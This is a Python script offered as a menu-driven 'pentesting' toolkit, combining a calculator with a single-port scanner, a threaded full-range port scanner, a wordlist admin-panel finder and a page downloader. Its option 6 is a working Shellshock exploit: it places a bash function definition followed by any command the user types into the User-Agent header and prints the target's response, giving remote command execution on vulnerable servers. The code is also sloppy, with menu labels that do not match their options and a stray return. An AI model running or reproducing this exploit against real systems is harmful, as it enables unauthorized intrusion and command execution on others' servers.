import os
import sys
import time
import cmath
import urllib 
import urllib.request, urllib.error, urllib.parse

def banner():
    start = '''\n[+] Samurai Machine Pentesters For Exploration [+]
    __________________________________________

     ¶▅c●▄███████||▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅||█~ ::~ :~ :►
    ▄██ ▲  █ █ ██▅▄▃▂
    ███▲ ▲ █ █ ███████         _/﹋\_
    ███████████████████████►   (҂`_´)  
    ███████████████████████    <,︻╦╤─ ҉ -   --
    ◥☼▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙☼◤       _/﹋\_
              
            '''
    for s in start:
        sys.stdout.write(s)
        sys.stdout.flush()
        time.sleep(0.0001)
banner()

def main():
    print('\n*[This is the main Menu]*   ')
    print('_'*28)
    print('[+] Select [1]. For Calculator')
    print('[+] Select [2]. Single port Scanner')
    print('[+] Select [3]. To Open a Target site and save data')
    print('[+] Select [4]. To Get your ipv4 adress')
    print('[+] Select [5]. For Full Port scanning')
    print('[+] Select [6]. For Shell-Shock exploit ')
    print('[+] Select [10].To Exit This Program')
    print('_'*45)
    option  = input('\n[+] Kindly select your Choice From: \n\n[-].[1], [2], [3], [4], [5], [6], [7], [8], [9] or [10]: ')
    while True:
        if option == '1':
            try:
                print('\n\n[-] .Calculator. [-]')
                print('-'*37)
                print('\n[1]. For Addition')
                print('[2]. For Subtraction')
                print('[3]. For Multiplication')
                print('[4]. For Devision')
                print('[5]. For Squreroot')
                print('[10].For Going back to main Menu')
                print('-'*37)

                while True:
                    option = input("\n[+] What is your Choice from \n[-]. [1], [2], [3], [4], [5] & [10]?: ")
                    if option == '1':
                        try:
                            print('\n[+] You selected [ %s ] for Addition' %option)
                            x = float(input('\n[+] What is Your first number to Add?: '))
                            y = float(input('[+] What is Your second digit to Add?: '))
                            print('\n[+] And your answer is = [{}]'.format(x + y))
                        except:
                            print('\n[+] Acritical error ocured')
                            continue

                    elif option == '2':
                        try:
                            print('\n[+] You selected [ %s ] for Subbtraction' %option)
                            x = float(input('\n[+] What is Your first number to Sub?: '))
                            y = float(input('[+] What is Your second digit to Sub?: '))
                            print('\n[+] And your answer is = [{}]'.format(x - y))
                        except:
                            print('\n[+] Acritical error ocured')
                            continue

                    elif option == '3':
                        try:
                            print('\n[+] You selected [ %s ] for Multiplication' %option)
                            x = float(input('\n[+] What is Your first number to Add?: '))
                            y = float(input('[+] What is Your second digit to Add?: '))
                            print('\n[+] And your answer is = [{}]'.format(x * y))
                        except:
                            print('\n[+] Acritical error ocured')
                            continue

                    elif option == '4':
                        try:
                            print('\n[+] You selected [ %s ] for Devision' %option)
                            x = float(input('\n[+] What is Your first number to Add?: '))
                            y = float(input('[+] What is Your second digit to Add?: '))
                            print('\n[+] And your answer is = [{}]'.format(x / y))
                        except:
                            print('\n[+] Acritical error ocured')
                            continue
                            ()
                    elif option == '5':
                        try:
                            print('\n[+] You selected [ %s ] for Squreroot' %option)
                            x = float(input('\n[+]. What is your Number to Squre?: '))
                            print('\n[+]  And your answer is = [{}]'.format(cmath.sqrt(x)))
                        except:
                            print('\n[+] Acritical error ocured')
                            continue
                        main()

                    elif option == '10':
                        print('\n[+] You selected [ %s ] for Going back to [ MAIN main ] ' %option)
                        main()
                        break
                    else:
                        print('\n [Q] Wrong choice choose [1], [2], [3], [4], [5] or [10]')
                        main()
                        continue
            except:
                print('\n[Q] Wrong choice choose [1], [2], [3], [4], [5] or [10]')
                main()
                continue

        elif option == '2':
            print('\n[+] You selected Option [%s] For port scanning' %option)
            print('-'*47)
            while True:
                import socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    target = str(input('[+] Please Key in your Target ip: '))
                    port = int(input('[+] Please key in your Target Port to scan: '))
                    if s.connect_ex((target, port)):
                       print('\n\n[-] This Port [ {} ] is Closed'.format(port))
                       main()
                    else:
                       print('\n\n[-] This Port [ {} ] is Opened'.format(port))
                       s.close()
                       main()
                except:
                    print('\n[+] An error ocured in option 2')
                main()
            break
        
        elif option == '3':              
            import sys
            import time
            
            print('\n\n[+] You selected Choice [{}] for Site Reading'.format(option))
            print('-'*47)
            start = """      
            [+]. Started the Engine pleas weit ...
         
            11110110111101101100011010110110100101
            01100111011100110010101001100111011100
            11110110111101101100011010110110100101
            011001110111001100101010           """
            
            for s in start:
                sys.stdout.write(s)
                sys.stdout.flush()
                time.sleep(0.0001)
                                    
            url = str(input('\n[+] What is Your Target in [http://, Htpps://] Format?: '))
            handle = urllib.request.urlopen(url).read().decode('utf-8')
            print('\n',handle)
                    
            while True:
                option = input('\n[+] Would you like to save? [Yes], [No]: ').strip().lower()
                if option == 'yes':
                   print('\n[+] You selected [{}]'.format(option))
                   where = input('\n[+] What name should the Matrix be saved as:? ')
                   place = input('[+] What place should The Matrix be saved [Full Path pleas]: ')
                   os.chdir(place)
                   with open(where, 'w') as w:
                        w.write(handle)
                        w.close()
                        print('[+] We are Done writting. Your File is in [ {}\{} ]'.format(os.getcwd(), where))
                        break
                        main()
                           
                else:
                    print('\n[+] Matrix not Saved:')
                    main()
            main()
            
        elif option == '4':
            print(f'\n[+] You selected option {option} For url scanning')
            import requests
            import sys
            from time import sleep

            def urlscanner():
                print("\n[+] Warning: Enter your target address such http://example.com")
                url = input("Enter your target url: ")

                start = "Start Scaning...\n"
                for s in start:
                    sys.stdout.write(s)
                    sys.stdout.flush()
                    sleep(0.1)
                try:
                    file = open(input("\n[+] Where is your Wordlist?: "), "r")
                    for link in file.read().splitlines():
                        curl = url + link
                        res = requests.get(curl)
                        if res.status_code == 200:
                            print("*" * 15)
                            print("[+] Admin panel found (:> {}".format(curl))
                            print("*" * 15)
                        else:
                            print("\033[91m Not found (:> {} \033[0m".format(curl))
                except:
                      print("\n[+] Shutdown Request!")

                      main()

            urlscanner()
            break
            main()   
            
        elif option == '5':
            while True:
                import socket
                import threading
                target = str(input('\n[+] What is your Target to scann all Ports?: '))
                print(f'\n[+] Scanning [{target}]\n')
                def portscanner(port):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target, port))
                        print(f"Port {port} is open")
                    except:
                          pass
                for port in range(1, 65000):
                    thread = threading.Thread(target = portscanner, args = [port])
                    thread.start()
                    
                main()
                break
            main()
            
        elif option == '6':
            print('\n[+] Option [ %s ] selected' %option)
            while True:
                try:
                   import sys, urllib.request, urllib.error, urllib.parse
                   URL=str(input('[+] What is yout target?: '))
                   print("\n[+] Shell_Shock - Make sure to type full path")
                   while True:
                        command=input("[+] Full path ~$: ")
                        opener=urllib.request.build_opener()
                        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
                        try:
                            response=opener.open(URL)
                            for line in response.readlines():
                                print(line.strip())
                        except Exception as e: 
                            print(e)
                            break
                        main()
                except:
                    print(f'\n[+] A critical error ocured at choice {option}')
                    break
                main()
            main()
            
        elif option == '7':
            print(f'\n[+] Choice [{option}] selected')
            while True:
                try:
                   x = 4
                   y = 8
                   return x + y
                except:
                    print()
                    break
                                 
        else:
            if option == '10':
               import sys
               import time
               print('\n[+] Option [{}] selected The Progam is exiting . .'.format(option))
               print('_'*48)
               end ="""
    ____                 _                    
   / __ \___  __________(_)___   _____      
  / /_/ / _ \/ ___/ ___/ / __ ` / __  \    
 / ____/  __/ /  (__  ) / /_/ // / /  /  
/_/    \___/_/  /____/_/\___[*]In Coding. 
_________________________________________[-By Shepherd-]

[-] Praise be to Jesus our Feature LORD [-] 
___________________________________________      
                       """  
               for e in end:
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.01)

               break
            break
        break

if __name__== '__main__':
    main()
